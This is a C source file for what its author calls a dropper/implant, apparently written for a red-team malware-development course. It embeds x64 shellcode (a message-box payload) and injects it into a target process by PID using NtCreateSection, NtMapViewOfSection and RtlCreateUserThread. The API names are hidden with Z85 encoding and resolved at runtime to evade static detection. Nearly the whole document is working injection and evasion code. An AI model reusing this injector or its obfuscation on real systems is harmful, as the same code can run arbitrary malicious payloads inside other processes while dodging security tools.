#include "CreateMapInject.h"
#include "Resolve.h"
#include "z85.h"


// msgbox64.bin shellcode from the RTO-maldev course
// Possible imporvments include shellcode obfucscation / payload testing.
// I didn't do that, I just wrote the dropper / implant 
// Lastly should add better error checking in this file
unsigned char buf[] = "\xFC\x48\x81\xE4\xF0\xFF\xFF\xFF\xE8\xD0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xD2\x65\x48\x8B\x52\x60\x3E\x48\x8B\x52\x18\x3E\x48\x8B\x52\x20\x3E\x48\x8B\x72\x50\x3E\x48\x0F\xB7\x4A\x4A\x4D\x31\xC9\x48\x31\xC0\xAC\x3C\x61\x7C\x02\x2C\x20\x41\xC1\xC9\x0D\x41\x01\xC1\xE2\xED\x52\x41\x51\x3E\x48\x8B\x52\x20\x3E\x8B\x42\x3C\x48\x01\xD0\x3E\x8B\x80\x88\x00\x00\x00\x48\x85\xC0\x74\x6F\x48\x01\xD0\x50\x3E\x8B\x48\x18\x3E\x44\x8B\x40\x20\x49\x01\xD0\xE3\x5C\x48\xFF\xC9\x3E\x41\x8B\x34\x88\x48\x01\xD6\x4D\x31\xC9\x48\x31\xC0\xAC\x41\xC1\xC9\x0D\x41\x01\xC1\x38\xE0\x75\xF1\x3E\x4C\x03\x4C\x24\x08\x45\x39\xD1\x75\xD6\x58\x3E\x44\x8B\x40\x24\x49\x01\xD0\x66\x3E\x41\x8B\x0C\x48\x3E\x44\x8B\x40\x1C\x49\x01\xD0\x3E\x41\x8B\x04\x88\x48\x01\xD0\x41\x58\x41\x58\x5E\x59\x5A\x41\x58\x41\x59\x41\x5A\x48\x83\xEC\x20\x41\x52\xFF\xE0\x58\x41\x59\x5A\x3E\x48\x8B\x12\xE9\x49\xFF\xFF\xFF\x5D\x49\xC7\xC1\x00\x00\x00\x00\x3E\x48\x8D\x95\x1A\x01\x00\x00\x3E\x4C\x8D\x85\x35\x01\x00\x00\x48\x31\xC9\x41\xBA\x45\x83\x56\x07\xFF\xD5\xBB\xE0\x1D\x2A\x0A\x41\xBA\xA6\x95\xBD\x9D\xFF\xD5\x48\x83\xC4\x28\x3C\x06\x7C\x0A\x80\xFB\xE0\x75\x05\xBB\x47\x13\x72\x6F\x6A\x00\x59\x41\x89\xDA\xFF\xD5\x48\x69\x20\x66\x72\x6F\x6D\x20\x52\x65\x64\x20\x54\x65\x61\x6D\x20\x4F\x70\x65\x72\x61\x74\x6F\x72\x21\x00\x52\x54\x4F\x3A\x20\x4D\x61\x6C\x44\x65\x76\x00";


// Initially I came accross a really cool article in 2019
// https://www.forrest-orr.net/post/malicious-memory-artifacts-part-i-dll-hollowing
// When I started writing this I knew I wanted to take a cooler approach to getting code execution. 
// Then I found the following blog
// https://ired.team/offensive-security/code-injection-process-injection/ntcreatesection-+-ntmapviewofsection-code-injection
// Thank you for all your work and cool stuff you do.
// I find myself googling iredteam almost every day. You're a huge inspiration 


BOOL CreateMapInject(DWORD pid)
{
	//11 16 21 26

	CHAR e_ntdll[] = "2zGGA9yYBCn0000";
	CHAR d_ntdll[10] = {};
	CHAR e_NtCreateSection[] = "1pin<zwNPW(q!oDXx(v>?0000";
	CHAR d_NtCreateSection[17] = {};

	CHAR e_kernel32[] = "1yH}K7wO:dT0000";
	CHAR d_kernel32[9] = {};

	CHAR e_NtMapViewOfSection[] = "1pioisA8{W:Ctz*HwN/*@z/bKP0000";
	CHAR d_NtMapViewOfSection[21] = {};


	CHAR e_GetCurrentProcess[] = "1m}D^fB-IIlzGFY}z!0v1A@Vgu6789";
	CHAR d_GetCurrentProcess[21] = {};

	CHAR e_OpenProcess[] = "1pJf(.p&ZF:wPI[)1234";
	CHAR d_OpenProcess[13] = "";


	CHAR e_RtlCreateUserThread[] = "1qGM.xA+eW3wMr!.A-uZ)wNP9H0000";
	CHAR d_RtlCreateUserThread[21] = {};


	BOOL ret = FALSE;
	HANDLE hSection = NULL;
	SIZE_T size = 4096;
	LARGE_INTEGER sectionSize = { size };
	NTSTATUS status;
	PVOID localSectionAddress = NULL, remoteSectionAddress = NULL;


	Z85_decode_with_padding(e_ntdll, d_ntdll, sizeof(e_ntdll));
	Z85_decode_with_padding(e_NtCreateSection, d_NtCreateSection, sizeof(e_NtCreateSection));
	NtCreateSectionPrototype fNtCreateSection = (NtCreateSectionPrototype)ResolveAPI(d_ntdll, d_NtCreateSection);

	// create a memory section
	fNtCreateSection(&hSection, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);

	Z85_decode_with_padding(e_NtMapViewOfSection, d_NtMapViewOfSection, sizeof(e_NtMapViewOfSection));
	NtMapViewOfSectionPrototype fNtMapViewOfSection = (NtMapViewOfSectionPrototype)ResolveAPI(d_ntdll, d_NtMapViewOfSection);

	Z85_decode_with_padding(e_kernel32, d_kernel32, sizeof(e_kernel32));
	Z85_decode_with_padding(e_GetCurrentProcess, d_GetCurrentProcess, sizeof(e_GetCurrentProcess));
	GetCurrentProcessPrototype fGetCurrentProcess = (GetCurrentProcessPrototype)ResolveAPI(d_kernel32, d_GetCurrentProcess);

	// create a view of the memory section in the local process
	fNtMapViewOfSection(hSection, fGetCurrentProcess(), &localSectionAddress, NULL, NULL, NULL, &size, 2, NULL, PAGE_READWRITE);
	
	Z85_decode_with_padding(e_OpenProcess, d_OpenProcess, sizeof(e_OpenProcess));
	OpenProcessPrototype fOpenProcess = (OpenProcessPrototype)ResolveAPI(d_kernel32, d_OpenProcess);

	// create a view of the memory section in the target process
	HANDLE hTarget = fOpenProcess(PROCESS_ALL_ACCESS, false, pid);
	fNtMapViewOfSection(hSection, hTarget, &remoteSectionAddress, NULL, NULL, NULL, &size, 2, NULL, PAGE_EXECUTE_READ);

	// copy shellcode to the local view, which will get reflected in the target process's mapped view
	memcpy(localSectionAddress, buf, sizeof(buf));

	Z85_decode_with_padding(e_RtlCreateUserThread, d_RtlCreateUserThread, sizeof(e_RtlCreateUserThread));
	RtlCreateUserThreadPrototype fRtlCreateUserThread = (RtlCreateUserThreadPrototype)ResolveAPI(d_ntdll, d_RtlCreateUserThread);

	HANDLE hTargetThread = NULL;
	status = fRtlCreateUserThread(hTarget, NULL, FALSE, 0, 0, 0, remoteSectionAddress, NULL, &hTargetThread, NULL);
	if (NT_SUCCESS(status))
	{
		ret = TRUE;
	}

	return ret;
} 